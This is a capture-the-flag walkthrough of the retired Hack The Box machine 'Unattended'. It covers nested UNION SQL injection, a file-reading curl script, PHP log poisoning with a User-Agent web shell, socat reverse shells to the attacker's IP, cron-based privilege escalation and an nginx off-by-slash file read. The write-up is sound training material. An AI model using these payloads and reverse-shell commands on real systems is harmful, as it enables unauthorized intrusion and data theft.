---
layout: post
title: "Unattended: Hack The Box Walkthrough"
date: 2019-08-24 15:41:31 +0000
last_modified_at: 2019-08-24 15:41:31 +0000
category: Walkthrough
tags: ["Hack The Box", Unattended, retired]
comments: true
image:
  feature: unattended-htb-walkthrough.jpg
  credit: cyapu / Pixabay
  creditlink: https://pixabay.com/photos/chair-pond-unattended-764080/
---

This post documents the complete walkthrough of Unattended, a retired vulnerable [VM][1] created by [guly][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Unattended is a retired VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.126 --rate=500                                                       

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-04-23 04:09:15 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 443/tcp on 10.10.10.126
Discovered open port 80/tcp on 10.10.10.126
```

Nothing unusual with the ports. Let's do one better with `nmap` scanning the discovered ports for services.

```
# nmap -n -v -Pn -p80,443 -A --reason -oN nmap.txt 10.10.10.126
...
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Issuer: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-19T09:43:58
| Not valid after:  2021-09-13T09:43:58
| MD5:   78b4 b5be 7cb9 dde0 fc4b 5b5b dae7 5690
|_SHA-1: 403d 52b6 239a e372 f804 018d 30ca b4da 16ac 4c07
```

Nothing much is going on for the `http` service, to be honest. Let's take a look at `https` service. But, before we do that, add `www.nestedflanders.htb` to `/etc/hosts.`

<a class="image-popup">
![88c3b276.png](/assets/images/posts/unattended-htb-walkthrough/88c3b276.png)
</a>

WTF. A default page??!!

### Directory/File Enumeration

Maybe `wfuzz` and SecLists's wordlist will offer a better fortune?

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 https://www.nestedflanders.htb/FUZZ                                 
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: https://www.nestedflanders.htb/FUZZ
Total requests: 4593

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

001348:  C=301      7 L       12 W          185 Ch        "dev"
002094:  C=200    368 L      933 W        10701 Ch        "index.html"
002095:  C=200     48 L      124 W         1244 Ch        "index.php"
003597:  C=200    177 L      428 W        10681 Ch        "server-status"
000010:  C=403     11 L       32 W          290 Ch        ".hta"
000011:  C=403     11 L       32 W          295 Ch        ".htaccess"
000012:  C=403     11 L       32 W          295 Ch        ".htpasswd"

Total time: 460.7816
Processed Requests: 4593
Filtered Requests: 4586
Requests/sec.: 9.967845
```

Let's take a look at `dev`, `index.php`, `server-status`.

_`dev`_

<a class="image-popup">
![d3d0ffa4.png](/assets/images/posts/unattended-htb-walkthrough/d3d0ffa4.png)
</a>

Hmm. I wonder what that means. See nginx [off-by-slash](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) fail later.

_`index.php`_

<a class="image-popup">
![2ad7d697.png](/assets/images/posts/unattended-htb-walkthrough/2ad7d697.png)
</a>

Interesting. As you click through the hyperlinks, each one shows a different message.

_main_

<a class="image-popup">
![b5fd0ff2.png](/assets/images/posts/unattended-htb-walkthrough/b5fd0ff2.png)
</a>

_about_

<a class="image-popup">
![7d826cc0.png](/assets/images/posts/unattended-htb-walkthrough/7d826cc0.png)
</a>

_contact_

<a class="image-popup">
![f6ba9790.png](/assets/images/posts/unattended-htb-walkthrough/f6ba9790.png)
</a>

Notice the IDs for each of those pages? They are SMTP port numbers. Not surprising, the file name of the GIF is `787c75233b93aa5e45c3f85d130bfbe7.gif`, which is MD5 hash of the word `smtp`.

_`server-status`_

<a class="image-popup">
![e106e743.png](/assets/images/posts/unattended-htb-walkthrough/e106e743.png)
</a>

This is absolutely surprising for me because `server-status` is usually `403 - Forbidden`. I can probably run a script to monitor incoming requests to the Apache instance.

### SQL Injection

And since there isn't any other clues to proceed, I'll use `sqlmap` to see what else I can glean from the site.

```
# sqlmap --level=5 --risk=3 -u https://www.nestedflanders.htb/index.php?id=465 --batch --threads=10 --dbms=mysql
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[*] starting @ 00:24:43 /2019-04-24/

[00:24:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465' AND 7206=7206-- KRax

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=465' AND SLEEP(5)-- rGmr
---
[00:24:45] [INFO] testing MySQL
[00:24:45] [INFO] confirming MySQL
[00:24:45] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:24:45] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.nestedflanders.htb'

[*] ending @ 00:24:45 /2019-04-24/
```

Nice. `sqlmap` found two techniques of SQL injection! Long story short, it's time-wasting to dump the entire current database, `neddy` by the way. We've to choose our battles wisely. Let's see what are the available tables.

```
Database: neddy
[11 tables]
+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
```

I've chosen tables `config`, `filepath`, and `idname`. Here they are.

_`db: neddy, table: config`_

```
Database: neddy                                                                                                                                                                                                                               
Table: config
[52 entries]
+-----+-------------------------+--------------------------------------------------------------------------+
| id  | option_name             | option_value                                                             |
+-----+-------------------------+--------------------------------------------------------------------------+
| 54  | offline                 | 0                                                                        |
| 55  | offline_message         | Site offline, please come back later                                     |
| 56  | display_offline_message | 0                                                                        |
| 57  | offline_image           | <blank>                                                                  |
| 58  | sitename                | NestedFlanders                                                           |
| 59  | editor                  | tinymce                                                                  |
| 60  | captcha                 | 0                                                                        |
| 61  | list_limit              | 20                                                                       |
| 62  | access                  | 1                                                                        |
| 63  | debug                   | 0                                                                        |
| 64  | debug_lang              | 0                                                                        |
| 65  | dbtype                  | mysqli                                                                   |
| 66  | host                    | localhost                                                                |
| 67  | live_site               | <blank>                                                                  |
| 68  | gzip                    | 0                                                                        |
| 69  | error_reporting         | default                                                                  |
| 70  | ftp_host                | 127.0.0.1                                                                |
| 71  | ftp_port                | 21                                                                       |
| 72  | ftp_user                | flanders                                                                 |
| 73  | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
| 74  | ftp_root                | /                                                                        |
| 75  | ftp_enable              | 1                                                                        |
| 76  | offset                  | UTC                                                                      |
| 77  | mailonline              | 1                                                                        |
| 78  | mailer                  | mail                                                                     |
| 79  | mailfrom                | nested@nestedflanders.htb                                                |
| 80  | fromname                | Neddy                                                                    |
| 81  | sendmail                | /usr/sbin/sendmail                                                       |
| 82  | smtpauth                | 0                                                                        |
| 83  | smtpuser                | <blank>                                                                  |
| 84  | smtppass                | <blank>                                                                  |
| 85  | smtppass                | <blank>                                                                  |
| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
| 87  | smtphost                | localhost                                                                |
| 88  | smtpsecure              | none                                                                     |
| 89  | smtpport                | 25                                                                       |
| 90  | caching                 | 0                                                                        |
| 91  | cache_handler           | file                                                                     |
| 92  | cachetime               | 15                                                                       |
| 93  | MetaDesc                | <blank>                                                                  |
| 94  | MetaKeys                | <blank>                                                                  |
| 95  | MetaTitle               | 1                                                                        |
| 96  | MetaAuthor              | 1                                                                        |
| 97  | MetaVersion             | 0                                                                        |
| 98  | robots                  | <blank>                                                                  |
| 99  | sef                     | 1                                                                        |
| 100 | sef_rewrite             | 0                                                                        |
| 101 | sef_suffix              | 0                                                                        |
| 102 | unicodeslugs            | 0                                                                        |
| 103 | feed_limit              | 10                                                                       |
| 104 | lifetime                | 1                                                                        |
| 105 | session_handler         | file                                                                     |
+-----+-------------------------+--------------------------------------------------------------------------+
```

_`db: neddy, table: filepath`_

```
Database: neddy
Table: filepath
[3 entries]
+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+
```

_`db: neddy, table: idname`_

```
Database: neddy
Table: idname
[6 entries]
+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+
```

I think I know what's going on with the site. After the site was attacked, the administrator probably nested their SQL query to fetch the corresponding pages, and in doing so, they were hoping that it could thwart further attacks. I smell Local File Inclusion (or LFI)...

The SQL query string in `index.php` probably goes something like this.

```php
<?php
  $query  = "SELECT path from filepath where name IN ";
  $query .= "(SELECT name FROM idname WHERE id = " . $_REQUEST['id'] . ")";
?>
```

Or something along these lines...

```php
<?php
  $name = "SELECT name FROM idname WHERE id = '" . $_REQUEST['id'] . "'";
  $path = "SELECT path from filepath where name = '" . $name . "'";
?>
```

Since I couldn't get the first query structure to work, I'm assuming it's the second query structure. From the `idname` table, we know that 25, 465 and 587 corresponds to `main`, `about` and `contact` respectively. So, in order to bypass the first query and control the outcome, I'm using the following UNION-based injection:

```
' UNION ALL SELECT "contact" -- endgame
```

<a class="image-popup">
![e913b3ff.png](/assets/images/posts/unattended-htb-walkthrough/e913b3ff.png)
</a>

Now that I can control the outcome for the first query, I'm going to "nest" another UNION-based injection to bypass the second query and control the file path.

```
' UNION ALL SELECT "' UNION ALL SELECT '/etc/passwd' -- avengers" -- endgame
```

<a class="image-popup">
![b81b10c0.png](/assets/images/posts/unattended-htb-walkthrough/b81b10c0.png)
</a>

Awesome but I need a better display. Towards that end, I wrote a `bash` script to help me read files.

<div class="filename"><span>read</span></div>

```bash
#!/bin/bash

HOST=www.nestedflanders.htb
URL="https://$HOST/index.php?id=465"
FILE="$1"
SQL=%27%20UNION%20ALL%20SELECT%20%22%27%20UNION%20ALL%20SELECT%20%27$FILE%27%20--%20avengers%22%20--%20endgame
curl -c cookie \
     -k \
     -s \
     -o /dev/null \
     $URL

curl -b cookie \
     -k \
     -s \
     ${URL}${SQL} \
| sed '27,$!d' \
| head -n -8

# clean up
rm cookie
```

<a class="image-popup">
![d1d6968e.png](/assets/images/posts/unattended-htb-walkthrough/d1d6968e.png)
</a>

Let's see if we can read the nginx configuration file.

<a class="image-popup">
![f8182226.png](/assets/images/posts/unattended-htb-walkthrough/f8182226.png)
</a>

If I can read any of the log files, then it's pretty clear that PHP log poisoning is next.

<a class="image-popup">
![af59bd59.png](/assets/images/posts/unattended-htb-walkthrough/af59bd59.png)
</a>

## Low-Privilege Shell

To poison the logs in order to achieve remote command execution, you need `openssl s_client` to send in PHP code, probaby through the User-Agent header like so.

```
GET / HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: <style type='text/css'>body { background-color: black; } #endgame { background-color: white; color: black; }</style><div id='endgame'><pre><?php echo shell_exec($_GET[0]); ?></pre></div>
```

<a class="image-popup">
![9be25949.png](/assets/images/posts/unattended-htb-walkthrough/9be25949.png)
</a>

Yes, I can execute remote commands.

...

Next, we'll get that reverse shell.

<a class="image-popup">
![1f8e4b9f.png](/assets/images/posts/unattended-htb-walkthrough/1f8e4b9f.png)
</a>

Guess what, `socat` is available.

_Firewall rules: only egress traffic to 80/tcp and 443/tcp is allowed._

<a class="image-popup">
![fe618dc8.png](/assets/images/posts/unattended-htb-walkthrough/fe618dc8.png)
</a>

_On my attacking machine_

```
# socat file:`tty`,raw,echo=0 tcp-listen:80
```

_On the browser address bar (need to urlencode)_

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.12.61:80
```

<a class="image-popup">
![fa385a7d.png](/assets/images/posts/unattended-htb-walkthrough/fa385a7d.png)
</a>

## Privilege Escalation

During enumeration of `www-data`'s account, I notice something weird. All the `tmpfs` are mapped with `nosuid`, `nodev`, and `noexec` options, which means that I can't execute anything on those mounted volumes, except for:

```
/var/cache/apache2/mod_cache_disk
```

Long story short, the rows in the `config` table appears to be a backup of Joomla's `configuration.php`, again, except for `checkrelease`. The files listed there are executed and restored every minute on the minute without fail, even if you change it to something else. Combining the two observations, I was able to get another shell as
`guly` by completing the following within a minute:

```
$ cd /var/cache/apache2/mod_cache_disk
$ echo -ne '!#/bin/bash\n\nsocat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:10.10.12.61:443' > check.sh; chmod +x check.sh
$ PW=1036913cf7d38d4ea4f79b050f171e9fbf3f5e
$ mysql -unestedflanders -p$PW -e "update neddy.config set option_value = '/var/cache/apache2/mod_cache_disk/check.sh' where id = 86;"
```

A minute later, `guly`'s shell appeared!

<a class="image-popup">
![e0502e47.png](/assets/images/posts/unattended-htb-walkthrough/e0502e47.png)
</a>

The `user.txt` is in `guly`'s home directory.

<a class="image-popup">
![9fe16106.png](/assets/images/posts/unattended-htb-walkthrough/9fe16106.png)
</a>

Moving on to `root`.

...

Notice that `guly` is in the `grub` group. This is certainly unusual. Searching the file system for everything to do with the `grub` group led to this.

<a class="image-popup">
![7b97fe9a.png](/assets/images/posts/unattended-htb-walkthrough/7b97fe9a.png)
</a>

That's a first. I'd never taken a good at the init ram disk (or `initrd`) before. Time to put on my forensic analyst hat. What kind of file am I dealing with?

<a class="image-popup">
![88a06e2b.png](/assets/images/posts/unattended-htb-walkthrough/88a06e2b.png)
</a>

Let's copy the file to `guly`'s home directory because the rest of the `tmpfs` are all `nosuid`, `nodev` and `noexec`.

<a class="image-popup">
![dcd33fdf.png](/assets/images/posts/unattended-htb-walkthrough/dcd33fdf.png)
</a>

So, `initrd.img` is a `cpio` archive. We can use `cpio` to extract it.

<a class="image-popup">
![15b2f294.png](/assets/images/posts/unattended-htb-walkthrough/15b2f294.png)
</a>

Searching for the string `guly` provides us with the next hint.

<a class="image-popup">
![74550885.png](/assets/images/posts/unattended-htb-walkthrough/74550885.png)
</a>

Let's see what goes before and after that line.

<a class="image-popup">
![cbfa7dec.png](/assets/images/posts/unattended-htb-walkthrough/cbfa7dec.png)
</a>

Hmm. What do we have here? Could that be `root`'s password? Alas, it's not. But, what about the weird `/sbin/uinitrd`? It's certainly not your standard command too. Let's try to run that.

<a class="image-popup">
![49e42dc8.png](/assets/images/posts/unattended-htb-walkthrough/49e42dc8.png)
</a>

Could this finally be `root`'s password. There's only one way to find out.

<a class="image-popup">
![04bb6fd6.png](/assets/images/posts/unattended-htb-walkthrough/04bb6fd6.png)
</a>

Perfect. Time to claim the prize.

<a class="image-popup">
![cd286213.png](/assets/images/posts/unattended-htb-walkthrough/cd286213.png)
</a>

:dancer:

## Afterthought

Recall the message "dev site has been moved to his own server" when navigating to `/dev`? You don't see the `dev` vhost or subdomain right? It turns out to be a subtle hint at nginx's "off-by-slash" misconfiguration; the `alias` directive defines a replacement for `/dev`.

<a class="image-popup">
![3232ce4f.png](/assets/images/posts/unattended-htb-walkthrough/3232ce4f.png)
</a>

It's almost trivial to exploit it to read files.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 https://www.nestedflanders.htb/dev../FUZZ/index.html
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: https://www.nestedflanders.htb/dev../FUZZ/index.html
Total requests: 4593

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

001348:  C=200      1 L        9 W           42 Ch        "dev"
002018:  C=200    368 L      933 W        10701 Ch        "html"

Total time: 460.2616
Processed Requests: 4593
Filtered Requests: 4591
Requests/sec.: 9.979106
```

There are two paths to `index.html` and both `index.html` are different in length. Let's read `index.php` to verify the query structure.

```
# curl -k https://www.nestedflanders.htb/dev../html/index.php
```

```php
<?php
$servername = "localhost";
$username = "nestedflanders";
$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
$db = "neddy";
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;

include "6fb17817efb4131ae4ae1acae0f7fd48.php";

function getTplFromID($conn) {
	global $debug;
	$valid_ids = array (25,465,587);
	if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
	} else {
		$sql = "SELECT name FROM idname where id = '25'";
	}
	if ($debug) { echo "sqltpl: $sql<br>\n"; }

	$result = $conn->query($sql);
	if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
		$ret = $row['name'];
	}
	} else {
		$ret = 'main';
	}
	if ($debug) { echo "rettpl: $ret<br>\n"; }
	return $ret;
}

function getPathFromTpl($conn,$tpl) {
	global $debug;
	$sql = "SELECT path from filepath where name = '".$tpl."'";
	if ($debug) { echo "sqlpath: $sql<br>\n"; }
	$result = $conn->query($sql);
	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
			$ret = $row['path'];
		}
	}
	if ($debug) { echo "retpath: $ret<br>\n"; }
	return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?>
```

The query structure consists of two SQL queries after all, which allows for nesting of UNION-based SQL injection.

[1]: https://www.hackthebox.eu/home/machines/profile/184
[2]: https://www.hackthebox.eu/home/users/profile/8292
[3]: https://www.hackthebox.eu/
